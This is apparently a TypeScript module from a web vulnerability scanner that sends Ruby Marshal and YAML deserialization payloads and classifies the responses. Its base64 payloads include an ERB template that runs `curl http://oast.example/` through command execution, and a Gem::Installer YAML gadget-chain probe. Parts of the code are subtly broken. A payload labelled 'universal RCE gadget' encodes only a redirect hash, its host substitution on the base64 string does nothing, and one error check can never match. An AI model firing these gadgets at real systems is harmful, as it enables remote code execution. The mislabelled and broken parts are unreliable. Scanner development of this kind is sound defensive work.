// Adapted from source-reference/vantix/secops/skills/ patterns.
// Rewritten in TypeScript. No runtime dependency on the vendored source.
import type { FamilyMetadata, OracleClassification, PayloadVariant, ProbeContext, ScannerResponseInput } from '../types';

export const META: FamilyMetadata = {
  id: 'deserialization-ruby',
  family: 'deserialization',
  title: 'Ruby Marshal.load deserialization',
  severity: 'critical',
  destructiveRisk: 'none',
  requiresOast: true,
  requiresBrowser: false,
  insertionPointKinds: ['body', 'cookie', 'header'],
  expectedSignals: ['oast-callback-confirmed', 'error-disclosure', 'status-delta'],
  cwe: [502],
};

// Ruby Marshal magic bytes: \x04\x08 (b64: BAg...)
const MARSHAL_MAGIC_B64 = 'BAhvOhJBcHBsaWNhdGlvbgY6EEBjb25maWd7AA==';

export function variants(ctx: ProbeContext): PayloadVariant[] {
  const oastHost = ctx.oastBaseUrl ? new URL(ctx.oastBaseUrl).hostname : 'oast.pf.example';
  return [
    {
      id: 'deser-ruby-marshal-magic',
      family: 'deserialization',
      value: MARSHAL_MAGIC_B64,
      encoding: 'raw',
      intent: 'Ruby Marshal.load magic bytes (\\x04\\x08) — triggers parse error if endpoint unmarshals',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['error-disclosure', 'status-delta'],
    },
    {
      id: 'deser-ruby-universal-rce-oast',
      family: 'deserialization',
      value: `BAh7B0kiEHBmX3JlZGlyZWN0BjoGRVRJIiRodHRwOi8vJHtvYXN0SG9zdH0vcGYtcnVieQY7AFQ=`.replace('${oastHost}', oastHost),
      encoding: 'raw',
      intent: 'Ruby universal RCE gadget via Rack/Rails redirect open — OAST HTTP callback',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'deser-ruby-rails-cookie',
      family: 'deserialization',
      value: MARSHAL_MAGIC_B64 + '0000',
      encoding: 'raw',
      intent: 'Corrupted Marshal blob for Rails cookie secret rotation probe',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['error-disclosure'],
    },
    {
      id: 'deser-ruby-erb-ssti',
      family: 'deserialization',
      value: 'BAhvOghFUkIGOgxAdGVtcGxhdGVJIiU8JT0gYGN1cmwgaHR0cDovL29hc3QuZXhhbXBsZS9gJT4GOwBU',
      encoding: 'raw',
      intent: 'ERB template embedded in Marshal object — SSTI via deserialization (OAST via curl)',
      requiresOast: true,
      destructiveRisk: 'none',
      expectedSignals: ['oast-callback-confirmed'],
    },
    {
      id: 'deser-ruby-truncated',
      family: 'deserialization',
      value: 'BAg=',
      encoding: 'raw',
      intent: 'Minimal Marshal magic — triggers EOFError if endpoint calls Marshal.load',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['error-disclosure'],
    },
    {
      id: 'deser-ruby-yaml-oast',
      family: 'deserialization',
      value: `--- !ruby/object:Gem::Installer\n_spec: !ruby/object:Gem::Specification\nname: a\nrequires_ruby_version:\n  requirements:\n    - - '>='\n      - !ruby/object:Gem::Version\n        version: 0\n_method_visibility: public\n_loaded_gems: {}\n`,
      encoding: 'raw',
      intent: 'Ruby YAML Gem::Installer gadget chain probe',
      requiresOast: false,
      destructiveRisk: 'none',
      expectedSignals: ['error-disclosure', 'status-delta'],
    },
  ];
}

export function classify(
  resp: ScannerResponseInput,
  variant: PayloadVariant,
  baseline: ScannerResponseInput,
): OracleClassification {
  const evidence: string[] = [];
  let responseClass: OracleClassification['responseClass'] = 'neutral-or-not-parsed';
  let confidence = 0.1;
  let nextAction: OracleClassification['nextAction'] = 'continue';

  const body = resp.bodyText.toLowerCase();
  const rubyError = body.includes('marshal') || body.includes('typeerror') ||
    body.includes('argumenterror') || body.includes('eofError') ||
    body.includes('ruby') || body.includes('rails');

  if (variant.requiresOast) {
    responseClass = 'neutral-or-not-parsed';
    confidence = 0.2;
    nextAction = 'continue';
    evidence.push('OAST probe dispatched — awaiting Ruby gadget callback');
  } else if (rubyError) {
    responseClass = 'parser-error';
    confidence = 0.78;
    nextAction = 'confirm';
    evidence.push('Ruby Marshal error in response — deserialization endpoint detected');
  } else if (resp.statusCode !== baseline.statusCode) {
    responseClass = 'status-delta';
    confidence = 0.4;
    nextAction = 'continue';
    evidence.push(`Status delta ${baseline.statusCode}→${resp.statusCode}`);
  } else {
    nextAction = 'stop-negative';
    evidence.push('No Ruby Marshal deserialization signal');
  }

  return { payloadVariantId: variant.id, responseClass, confidence, evidence, nextAction };
}
